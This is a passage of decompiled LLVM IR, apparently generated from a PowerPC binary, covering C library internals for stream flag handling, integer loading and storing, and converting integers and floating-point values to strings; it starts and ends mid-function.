  %v1_10011a38 = and i32 %v4_10011a2c, 2176
  store i32 %v1_10011a38, i32* %r9.global-to-local, align 4
  %v3_10011a38 = icmp eq i32 %v1_10011a38, 0
  br i1 %v3_10011a38, label %dec_label_pc_10011a40, label %dec_label_pc_10011a54

dec_label_pc_10011a40:                            ; preds = %dec_label_pc_10011a38
  %v2_10011a40 = or i32 %v1_10011a30, %v4_10011a2c
  store i32 %v2_10011a40, i32* %r0.global-to-local, align 4
  %v1_10011a44 = trunc i32 %v2_10011a40 to i16
  store i16 %v1_10011a44, i16* %arg1, align 2
  %v0_10011a48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011a48

dec_label_pc_10011a48:                            ; preds = %entry, %dec_label_pc_10011a40
  %v0_10011a84 = phi i32 [ %tmp, %entry ], [ %v0_10011a48.pre, %dec_label_pc_10011a40 ]
  %v1_10011a48 = inttoptr i32 %v0_10011a84 to i16*
  %v2_10011a48 = load i16, i16* %v1_10011a48, align 2
  %v3_10011a48 = zext i16 %v2_10011a48 to i32
  %v1_10011a4c = and i32 %v3_10011a48, 32
  store i32 %v1_10011a4c, i32* %r0.global-to-local, align 4
  %v3_10011a4c = icmp eq i32 %v1_10011a4c, 0
  br i1 %v3_10011a4c, label %dec_label_pc_10011a74, label %dec_label_pc_10011a54

dec_label_pc_10011a54:                            ; preds = %dec_label_pc_10011a38, %dec_label_pc_10011a48
  %v0_10011a54 = call i32 @__errno_location()
  store i32 %v0_10011a54, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10011a5c = inttoptr i32 %v0_10011a54 to i32*
  store i32 9, i32* %v2_10011a5c, align 4
  br label %dec_label_pc_10011a60

dec_label_pc_10011a60:                            ; preds = %dec_label_pc_10011a9c, %dec_label_pc_10011a54
  %v0_10011a60 = load i32, i32* @r31, align 4
  %v1_10011a60 = inttoptr i32 %v0_10011a60 to i16*
  %v2_10011a60 = load i16, i16* %v1_10011a60, align 2
  %v3_10011a60 = zext i16 %v2_10011a60 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10011a68 = or i32 %v3_10011a60, 8
  store i32 %v1_10011a68, i32* %r0.global-to-local, align 4
  %v1_10011a6c = trunc i32 %v1_10011a68 to i16
  store i16 %v1_10011a6c, i16* %v1_10011a60, align 2
  br label %dec_label_pc_10011afc

dec_label_pc_10011a74:                            ; preds = %dec_label_pc_10011a48
  %tmp8 = urem i16 %v2_10011a48, 4
  %v1_10011a74 = zext i16 %tmp8 to i32
  store i32 %v1_10011a74, i32* %r0.global-to-local, align 4
  %v3_10011a74 = icmp eq i16 %tmp8, 0
  br i1 %v3_10011a74, label %dec_label_pc_10011ad8, label %dec_label_pc_10011a7c

dec_label_pc_10011a7c:                            ; preds = %dec_label_pc_10011a74
  %v1_10011a7c = and i32 %v3_10011a48, 4
  store i32 %v1_10011a7c, i32* %r9.global-to-local, align 4
  %v3_10011a7c = icmp eq i32 %v1_10011a7c, 0
  br i1 %v3_10011a7c, label %dec_label_pc_10011a84, label %dec_label_pc_10011abc

dec_label_pc_10011a84:                            ; preds = %dec_label_pc_10011a7c
  %v1_10011a84 = add i32 %v0_10011a84, 20
  %v2_10011a84 = inttoptr i32 %v1_10011a84 to i32*
  %v3_10011a84 = load i32, i32* %v2_10011a84, align 4
  store i32 %v3_10011a84, i32* %r0.global-to-local, align 4
  %v1_10011a88 = add i32 %v0_10011a84, 16
  %v2_10011a88 = inttoptr i32 %v1_10011a88 to i32*
  %v3_10011a88 = load i32, i32* %v2_10011a88, align 4
  store i32 %v3_10011a88, i32* %r9.global-to-local, align 4
  %v4_10011a8c = icmp eq i32 %v3_10011a84, %v3_10011a88
  br i1 %v4_10011a8c, label %dec_label_pc_10011a94, label %dec_label_pc_10011a9c

dec_label_pc_10011a94:                            ; preds = %dec_label_pc_10011a84
  %v1_10011a94 = and i32 %v3_10011a48, 2
  store i32 %v1_10011a94, i32* %r0.global-to-local, align 4
  %v3_10011a94 = icmp eq i32 %v1_10011a94, 0
  br i1 %v3_10011a94, label %dec_label_pc_10011abc, label %dec_label_pc_10011a9c

dec_label_pc_10011a9c:                            ; preds = %dec_label_pc_10011a84, %dec_label_pc_10011a94
  %v1_10011a9c = and i32 %v3_10011a48, 1024
  store i32 %v1_10011a9c, i32* %r9.global-to-local, align 4
  %v0_10011aa4 = call i32 @__asm_mfcr()
  store i32 %v0_10011aa4, i32* %r3.global-to-local, align 4
  %v1_10011aa8 = call i32 @__asm_rlwinm(i32 %v0_10011aa4, i32 3, i32 31, i32 31)
  %v1_10011aac = sub i32 2, %v1_10011aa8
  store i32 %v1_10011aac, i32* @r5, align 4
  store i32 268507828, i32* @lr, align 4
  %v1_10011ab0 = call i32 @__GI_fseek(i32 %v1_10011aac)
  store i32 %v1_10011ab0, i32* %r3.global-to-local, align 4
  %v3_10011ab4 = icmp eq i32 %v1_10011ab0, 0
  br i1 %v3_10011ab4, label %dec_label_pc_10011a9c.dec_label_pc_10011abc_crit_edge, label %dec_label_pc_10011a60

dec_label_pc_10011a9c.dec_label_pc_10011abc_crit_edge: ; preds = %dec_label_pc_10011a9c
  %v0_10011abc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011abc

dec_label_pc_10011abc:                            ; preds = %dec_label_pc_10011a9c.dec_label_pc_10011abc_crit_edge, %dec_label_pc_10011a7c, %dec_label_pc_10011a94
  %v0_10011abc = phi i32 [ %v0_10011abc.pre, %dec_label_pc_10011a9c.dec_label_pc_10011abc_crit_edge ], [ %v0_10011a84, %dec_label_pc_10011a7c ], [ %v0_10011a84, %dec_label_pc_10011a94 ]
  %v1_10011abc = inttoptr i32 %v0_10011abc to i16*
  %v2_10011abc = load i16, i16* %v1_10011abc, align 2
  %v3_10011abc = zext i16 %v2_10011abc to i32
  store i32 %v3_10011abc, i32* %r0.global-to-local, align 4
  %v1_10011ac0 = add i32 %v0_10011abc, 8
  %v2_10011ac0 = inttoptr i32 %v1_10011ac0 to i32*
  %v3_10011ac0 = load i32, i32* %v2_10011ac0, align 4
  store i32 %v3_10011ac0, i32* %r9.global-to-local, align 4
  %v1_10011ac4 = call i32 @__asm_rlwinm(i32 %v3_10011abc, i32 0, i32 0, i32 29)
  %v2_10011ac4 = trunc i32 %v1_10011ac4 to i16
  store i32 %v1_10011ac4, i32* %r0.global-to-local, align 4
  %v3_10011ac8 = load i32, i32* @r31, align 4
  %v4_10011ac8 = inttoptr i32 %v3_10011ac8 to i16*
  store i16 %v2_10011ac4, i16* %v4_10011ac8, align 2
  %v0_10011acc = load i32, i32* %r9.global-to-local, align 4
  %v1_10011acc = load i32, i32* @r31, align 4
  %v2_10011acc = add i32 %v1_10011acc, 20
  %v3_10011acc = inttoptr i32 %v2_10011acc to i32*
  store i32 %v0_10011acc, i32* %v3_10011acc, align 4
  %v0_10011ad0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011ad0 = load i32, i32* @r31, align 4
  %v2_10011ad0 = add i32 %v1_10011ad0, 24
  %v3_10011ad0 = inttoptr i32 %v2_10011ad0 to i32*
  store i32 %v0_10011ad0, i32* %v3_10011ad0, align 4
  %v0_10011ad4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011ad4 = load i32, i32* @r31, align 4
  %v2_10011ad4 = add i32 %v1_10011ad4, 16
  %v3_10011ad4 = inttoptr i32 %v2_10011ad4 to i32*
  store i32 %v0_10011ad4, i32* %v3_10011ad4, align 4
  %v0_10011ad8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011ad8

dec_label_pc_10011ad8:                            ; preds = %dec_label_pc_10011a74, %dec_label_pc_10011abc
  %v2_10011ae4 = phi i32 [ %v0_10011a84, %dec_label_pc_10011a74 ], [ %v0_10011ad8.pre, %dec_label_pc_10011abc ]
  %v1_10011ad8 = inttoptr i32 %v2_10011ae4 to i16*
  %v2_10011ad8 = load i16, i16* %v1_10011ad8, align 2
  %v3_10011ad8 = zext i16 %v2_10011ad8 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10011ae0 = or i32 %v3_10011ad8, 64
  store i32 %v1_10011ae0, i32* %r0.global-to-local, align 4
  %v1_10011ae4 = trunc i32 %v1_10011ae0 to i16
  store i16 %v1_10011ae4, i16* %v1_10011ad8, align 2
  %v0_10011ae8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011ae8 = urem i32 %v0_10011ae8, 65536
  store i32 %v1_10011ae8, i32* %r0.global-to-local, align 4
  %v1_10011aec = and i32 %v0_10011ae8, 2816
  store i32 %v1_10011aec, i32* %r9.global-to-local, align 4
  %v3_10011aec = icmp eq i32 %v1_10011aec, 0
  br i1 %v3_10011aec, label %dec_label_pc_10011af4, label %dec_label_pc_10011afc

dec_label_pc_10011af4:                            ; preds = %dec_label_pc_10011ad8
  %v0_10011af4 = load i32, i32* @r31, align 4
  %v1_10011af4 = add i32 %v0_10011af4, 12
  %v2_10011af4 = inttoptr i32 %v1_10011af4 to i32*
  %v3_10011af4 = load i32, i32* %v2_10011af4, align 4
  store i32 %v3_10011af4, i32* %r0.global-to-local, align 4
  %v2_10011af8 = add i32 %v0_10011af4, 28
  %v3_10011af8 = inttoptr i32 %v2_10011af8 to i32*
  store i32 %v3_10011af4, i32* %v3_10011af8, align 4
  br label %dec_label_pc_10011afc

dec_label_pc_10011afc:                            ; preds = %dec_label_pc_10011ad8, %dec_label_pc_10011a60, %dec_label_pc_10011af4
  store i32 %v0_10011a18, i32* %r0.global-to-local, align 4
  store i32 %v0_10011a20, i32* @r31, align 4
  %v0_10011b0c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011b0c

; uselistorder directives
  uselistorder i32 %v0_10011ae8, { 1, 0 }
  uselistorder i32 %v1_10011ac4, { 1, 0 }
  uselistorder i32 %v0_10011abc, { 1, 0 }
  uselistorder i32 %v0_10011a84, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_10011a2c, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011afc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011ad8, { 1, 0 }
  uselistorder label %dec_label_pc_10011abc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10011a54, { 1, 0 }
  uselistorder label %dec_label_pc_10011a48, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_10011b10 = load i32, i32* @r5, align 4
  %v1_10011b10 = icmp slt i32 %v0_10011b10, 0
  %v1_10011b14 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10011b50 = icmp eq i32 %v1_10011b14, 0
  br i1 %v1_10011b10, label %dec_label_pc_10011b50, label %dec_label_pc_10011b1c

dec_label_pc_10011b1c:                            ; preds = %entry
  br i1 %v3_10011b50, label %dec_label_pc_10011b24, label %dec_label_pc_10011b58

dec_label_pc_10011b24:                            ; preds = %dec_label_pc_10011b1c
  %v3_10011b24 = icmp eq i32 %arg1, 256
  br i1 %v3_10011b24, label %dec_label_pc_10011b30, label %dec_label_pc_10011b38

dec_label_pc_10011b30:                            ; preds = %dec_label_pc_10011b24
  br label %dec_label_pc_10011b44

dec_label_pc_10011b38:                            ; preds = %dec_label_pc_10011b24
  %v3_10011b38 = icmp eq i32 %arg1, 512
  br i1 %v3_10011b38, label %dec_label_pc_10011b40, label %dec_label_pc_10011b44

dec_label_pc_10011b40:                            ; preds = %dec_label_pc_10011b38
  br label %dec_label_pc_10011b44

dec_label_pc_10011b44:                            ; preds = %dec_label_pc_10011b38, %dec_label_pc_10011b30, %dec_label_pc_10011b40
  ret i32 0

dec_label_pc_10011b50:                            ; preds = %entry
  br i1 %v3_10011b50, label %dec_label_pc_10011b64, label %dec_label_pc_10011b58

dec_label_pc_10011b58:                            ; preds = %dec_label_pc_10011b1c, %dec_label_pc_10011b50
  %v2_10011b58 = load i32, i32* %arg2, align 4
  ret i32 %v2_10011b58

dec_label_pc_10011b64:                            ; preds = %dec_label_pc_10011b50
  %v3_10011b64 = icmp eq i32 %arg1, 256
  %v2_10011b68 = load i32, i32* %arg2, align 4
  br i1 %v3_10011b64, label %dec_label_pc_10011b70, label %dec_label_pc_10011b78

dec_label_pc_10011b70:                            ; preds = %dec_label_pc_10011b64
  %v1_10011b70 = urem i32 %v2_10011b68, 256
  br label %dec_label_pc_10011b84

dec_label_pc_10011b78:                            ; preds = %dec_label_pc_10011b64
  %v3_10011b78 = icmp eq i32 %arg1, 512
  br i1 %v3_10011b78, label %dec_label_pc_10011b80, label %dec_label_pc_10011b84

dec_label_pc_10011b80:                            ; preds = %dec_label_pc_10011b78
  %v1_10011b80 = mul i32 %v2_10011b68, 65536
  %v2_10011b80 = sdiv i32 %v1_10011b80, 65536
  br label %dec_label_pc_10011b84

dec_label_pc_10011b84:                            ; preds = %dec_label_pc_10011b78, %dec_label_pc_10011b70, %dec_label_pc_10011b80
  %v0_10011b84 = phi i32 [ %v2_10011b68, %dec_label_pc_10011b78 ], [ %v1_10011b70, %dec_label_pc_10011b70 ], [ %v2_10011b80, %dec_label_pc_10011b80 ]
  %tmp = icmp slt i32 %v0_10011b84, 0
  %v1_10011b88 = zext i1 %tmp to i32
  %v2_10011b88 = ashr i32 %v0_10011b84, 31
  %v3_10011b88 = and i32 %v2_10011b88, -2
  %v4_10011b88 = or i32 %v3_10011b88, %v1_10011b88
  ret i32 %v4_10011b88

; uselistorder directives
  uselistorder i32 %v0_10011b84, { 1, 0 }
  uselistorder i32 %v2_10011b68, { 2, 0, 1 }
  uselistorder i1 %v3_10011b50, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 2, 1, 3 }
  uselistorder label %dec_label_pc_10011b84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011b58, { 1, 0 }
  uselistorder label %dec_label_pc_10011b44, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10011b90 = load i32, i32* @r4, align 4
  %v3_10011b90 = icmp eq i32 %v0_10011b90, 256
  br i1 %v3_10011b90, label %dec_label_pc_10011b9c, label %dec_label_pc_10011ba4

dec_label_pc_10011b9c:                            ; preds = %entry
  %v0_10011b9c = load i32, i32* @r6, align 4
  %v1_10011b9c = trunc i32 %v0_10011b9c to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10011b9c, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10011ba4:                            ; preds = %entry
  %v3_10011b94 = icmp eq i32 %v0_10011b90, 2048
  br i1 %v3_10011b94, label %dec_label_pc_10011bac, label %dec_label_pc_10011bb8

dec_label_pc_10011bac:                            ; preds = %dec_label_pc_10011ba4
  %v0_10011bac = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10011bac, i32* %tmp2, align 4
  %v0_10011bb0 = load i32, i32* @r6, align 4
  %v3_10011bb0 = add i32 %tmp, 4
  %v4_10011bb0 = inttoptr i32 %v3_10011bb0 to i32*
  store i32 %v0_10011bb0, i32* %v4_10011bb0, align 4
  ret i32 %tmp

dec_label_pc_10011bb8:                            ; preds = %dec_label_pc_10011ba4
  %v3_10011ba4 = icmp eq i32 %v0_10011b90, 512
  %v0_10011bbc = load i32, i32* @r6, align 4
  br i1 %v3_10011ba4, label %dec_label_pc_10011bbc, label %dec_label_pc_10011bc4

dec_label_pc_10011bbc:                            ; preds = %dec_label_pc_10011bb8
  %v1_10011bbc = trunc i32 %v0_10011bbc to i16
  store i16 %v1_10011bbc, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10011bc4:                            ; preds = %dec_label_pc_10011bb8
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10011bbc, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 1, 0, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10011bcc = load i32, i32* @r7, align 4
  %v3_10011bcc = icmp eq i32 %v0_10011bcc, 0
  store i1 %v3_10011bcc, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_10011bcc, -1
  br i1 %tmp12, label %dec_label_pc_10011c00, label %dec_label_pc_10011be0

dec_label_pc_10011be0:                            ; preds = %entry
  %v0_10011be0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011be4 = sub i32 0, %v0_10011bcc
  store i32 %v1_10011be4, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_10011be0, -1
  br i1 %tmp13, label %dec_label_pc_10011c00, label %dec_label_pc_10011bec

dec_label_pc_10011bec:                            ; preds = %dec_label_pc_10011be0
  %v0_10011bec = load i32, i32* %r6.global-to-local, align 4
  %v1_10011bec = sub i32 0, %v0_10011bec
  %v2_10011bec = sub i32 -1, %v0_10011bec
  store i32 %v1_10011bec, i32* %r6.global-to-local, align 4
  %v4_10011bec = icmp uge i32 %v2_10011bec, %v1_10011bec
  %v1_10011bf0 = sub i32 -1, %v0_10011be0
  %v3_10011bf0 = zext i1 %v4_10011bec to i32
  %v4_10011bf0 = add i32 %v3_10011bf0, %v1_10011bf0
  store i32 %v4_10011bf0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011c00

dec_label_pc_10011c00:                            ; preds = %entry, %dec_label_pc_10011be0, %dec_label_pc_10011bec
  %v1_10011c04 = phi i32 [ %v1_10011be4, %dec_label_pc_10011bec ], [ %v1_10011be4, %dec_label_pc_10011be0 ], [ %v0_10011bcc, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10011bec ], [ 0, %dec_label_pc_10011be0 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10011c04 = udiv i32 -1, %v1_10011c04
  store i32 %v2_10011c04, i32* @r8, align 4
  %v2_10011c0c = load i32, i32* %r3.global-to-local, align 4
  %v3_10011c0c = inttoptr i32 %v2_10011c0c to i8*
  store i8 0, i8* %v3_10011c0c, align 1
  %v0_10011c10 = load i32, i32* @r8, align 4
  %v1_10011c10 = load i32, i32* @r7, align 4
  %v2_10011c10 = mul i32 %v1_10011c10, %v0_10011c10
  %v1_10011c14 = sub i32 0, %v2_10011c10
  store i32 %v1_10011c14, i32* @r31, align 4
  %v4_10011c18 = icmp eq i32 %v1_10011c10, %v1_10011c14
  br i1 %v4_10011c18, label %dec_label_pc_10011c20, label %dec_label_pc_10011c28

dec_label_pc_10011c20:                            ; preds = %dec_label_pc_10011c00
  %v1_10011c20 = add i32 %v0_10011c10, 1
  store i32 %v1_10011c20, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10011c28

dec_label_pc_10011c28:                            ; preds = %dec_label_pc_10011c00, %dec_label_pc_10011c20
  %v0_10011c28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10011c28, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10011c2c

dec_label_pc_10011c2cthread-pre-split:            ; preds = %dec_label_pc_10011c80
  %v0_10011c2c.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_10011c30.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10011c2c

dec_label_pc_10011c2c:                            ; preds = %dec_label_pc_10011c2cthread-pre-split, %dec_label_pc_10011c28
  %v1_10011c74 = phi i32 [ %v1_10011c30.pre, %dec_label_pc_10011c2cthread-pre-split ], [ %v1_10011c10, %dec_label_pc_10011c28 ]
  %v1_10011c44 = phi i32 [ %v0_10011c2c.pr, %dec_label_pc_10011c2cthread-pre-split ], [ %v0_10011c28, %dec_label_pc_10011c28 ]
  %v3_10011c2c = icmp eq i32 %v1_10011c44, 0
  %v0_10011c30 = load i32, i32* %r6.global-to-local, align 4
  %v2_10011c30 = udiv i32 %v0_10011c30, %v1_10011c74
  br i1 %v3_10011c2c, label %dec_label_pc_10011c74, label %dec_label_pc_10011c38

dec_label_pc_10011c38:                            ; preds = %dec_label_pc_10011c2c
  %v2_10011c38 = udiv i32 %v1_10011c44, %v1_10011c74
  %v2_10011c3c = mul i32 %v2_10011c38, %v1_10011c74
  %v2_10011c40 = mul i32 %v2_10011c30, %v1_10011c74
  %v2_10011c44 = sub i32 %v1_10011c44, %v2_10011c3c
  store i32 %v2_10011c38, i32* %r12.global-to-local, align 4
  %v0_10011c4c = load i32, i32* @r31, align 4
  %v2_10011c4c = mul i32 %v0_10011c4c, %v2_10011c44
  %v2_10011c50 = sub i32 %v0_10011c30, %v2_10011c40
  %v2_10011c54 = add i32 %v2_10011c4c, %v2_10011c50
  %v0_10011c58 = load i32, i32* @r8, align 4
  %v2_10011c58 = mul i32 %v0_10011c58, %v2_10011c44
  %v2_10011c5c = udiv i32 %v2_10011c54, %v1_10011c74
  %v2_10011c60 = add i32 %v2_10011c58, %v2_10011c30
  %v2_10011c64 = mul i32 %v2_10011c5c, %v1_10011c74
  %v2_10011c68 = add i32 %v2_10011c60, %v2_10011c5c
  store i32 %v2_10011c68, i32* %r6.global-to-local, align 4
  %v2_10011c6c = sub i32 %v2_10011c54, %v2_10011c64
  store i32 %v2_10011c6c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011c80

dec_label_pc_10011c74:                            ; preds = %dec_label_pc_10011c2c
  %v2_10011c74 = mul i32 %v2_10011c30, %v1_10011c74
  %v2_10011c78 = sub i32 %v0_10011c30, %v2_10011c74
  store i32 %v2_10011c78, i32* %r5.global-to-local, align 4
  store i32 %v2_10011c30, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10011c80

dec_label_pc_10011c80:                            ; preds = %dec_label_pc_10011c38, %dec_label_pc_10011c74
  %v1_10011c84 = phi i32 [ %v2_10011c38, %dec_label_pc_10011c38 ], [ 0, %dec_label_pc_10011c74 ]
  %v0_10011c84 = phi i32 [ %v2_10011c68, %dec_label_pc_10011c38 ], [ %v2_10011c30, %dec_label_pc_10011c74 ]
  %v0_10011c88 = phi i32 [ %v2_10011c6c, %dec_label_pc_10011c38 ], [ %v2_10011c78, %dec_label_pc_10011c74 ]
  %v2_10011c84 = or i32 %v0_10011c84, %v1_10011c84
  %v5_10011c84 = icmp eq i32 %v2_10011c84, 0
  store i1 %v5_10011c84, i1* %cr0_eq.global-to-local, align 1
  %v1_10011c8c = load i32, i32* @r30, align 4
  %v0_10011c90 = load i32, i32* %r3.global-to-local, align 4
  %v1_10011c90 = add i32 %v0_10011c90, -1
  store i32 %v1_10011c90, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_10011c88, 10
  %v1_10011c88.v2_10011c8c.v = select i1 %tmp14, i32 48, i32 %v1_10011c8c
  %v1_10011c88.v2_10011c8c = add i32 %v0_10011c88, %v1_10011c88.v2_10011c8c.v
  %extract.t9.extract.t = trunc i32 %v1_10011c88.v2_10011c8c to i8
  %v3_10011ca0 = inttoptr i32 %v1_10011c90 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10011ca0, align 1
  %v0_10011ca4 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10011ca4, label %dec_label_pc_10011ca8, label %dec_label_pc_10011c2cthread-pre-split

dec_label_pc_10011ca8:                            ; preds = %dec_label_pc_10011c80
  %v0_10011ca8 = load i32, i32* @r29, align 4
  %v3_10011ca8 = icmp eq i32 %v0_10011ca8, 0
  br i1 %v3_10011ca8, label %dec_label_pc_10011ca8.dec_label_pc_10011cb8_crit_edge, label %dec_label_pc_10011cb0

dec_label_pc_10011ca8.dec_label_pc_10011cb8_crit_edge: ; preds = %dec_label_pc_10011ca8
  %v0_10011cc0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011cb8

dec_label_pc_10011cb0:                            ; preds = %dec_label_pc_10011ca8
  %v2_10011cb4 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011cb4 = add i32 %v2_10011cb4, -1
  %v4_10011cb4 = inttoptr i32 %v3_10011cb4 to i8*
  store i8 45, i8* %v4_10011cb4, align 1
  store i32 %v3_10011cb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011cb8

dec_label_pc_10011cb8:                            ; preds = %dec_label_pc_10011ca8.dec_label_pc_10011cb8_crit_edge, %dec_label_pc_10011cb0
  %v0_10011cc0 = phi i32 [ %v0_10011cc0.pre, %dec_label_pc_10011ca8.dec_label_pc_10011cb8_crit_edge ], [ %v3_10011cb4, %dec_label_pc_10011cb0 ]
  ret i32 %v0_10011cc0

; uselistorder directives
  uselistorder i32 %v2_10011c38, { 1, 2, 0 }
  uselistorder i32 %v2_10011c30, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10011c74, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10011c10, { 1, 2, 0 }
  uselistorder i32 %v0_10011c10, { 1, 0 }
  uselistorder i32 %v0_10011bcc, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10011cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10011c80, { 1, 0 }
  uselistorder label %dec_label_pc_10011c28, { 1, 0 }
  uselistorder label %dec_label_pc_10011c00, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10011cc4 = load i32, i32* @lr, align 4
  store i32 %v0_10011cc4, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10011ce0 = add i32 %tmp, 11
  %v2_10011ce0 = inttoptr i32 %v1_10011ce0 to i8*
  %v3_10011ce0 = load i8, i8* %v2_10011ce0, align 1
  %v4_10011ce0 = zext i8 %v3_10011ce0 to i32
  store i32 %v4_10011ce0, i32* %r31.global-to-local, align 4
  %v1_10011ce4 = or i32 %v4_10011ce0, 32
  %v1_10011ce8 = icmp ult i32 %v1_10011ce4, 97
  %v3_10011ce8 = icmp eq i32 %v1_10011ce4, 97
  store i1 %v1_10011ce8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011ce8, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10011cf4 = add i32 %tmp, 4
  %v2_10011cf4 = inttoptr i32 %v1_10011cf4 to i32*
  %v3_10011cf4 = load i32, i32* %v2_10011cf4, align 4
  store i32 %v3_10011cf4, i32* %r28.global-to-local, align 4
  %v2_10011cf8 = load i32, i32* %arg2, align 4
  store i32 %v2_10011cf8, i32* %r30.global-to-local, align 4
  br i1 %v3_10011ce8, label %dec_label_pc_10011d00, label %dec_label_pc_10011d08

dec_label_pc_10011d00:                            ; preds = %entry
  %v1_10011d00 = add nuw nsw i32 %v4_10011ce0, 6
  store i32 %v1_10011d00, i32* %r0.global-to-local, align 4
